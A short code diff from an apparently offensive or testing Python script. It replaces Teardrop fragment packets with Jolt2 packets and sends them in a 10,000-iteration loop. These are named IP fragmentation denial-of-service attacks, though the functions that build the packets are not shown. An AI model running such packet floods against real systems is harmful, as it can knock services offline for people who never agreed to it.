@@ -22,8 +22,8 @@ if __name__ == '__main__':
         data = f.read()
         # print(data)
     for i in range(0, 10000):
-        pkt = tear_drop(1, 0, 17, data=data)
+        # pkt = ipv4_jolt2(1, 1023, data=data)
+        # send_packets(pkt)
+        pkt = ipv4_jolt2(0, 1023, data=data)
         send_packets(pkt)
-        pkt = tear_drop(1, 176, 17, data=data)
-        send_packets(pkt)
-        time.sleep(0.05)
+        time.sleep(0.1)
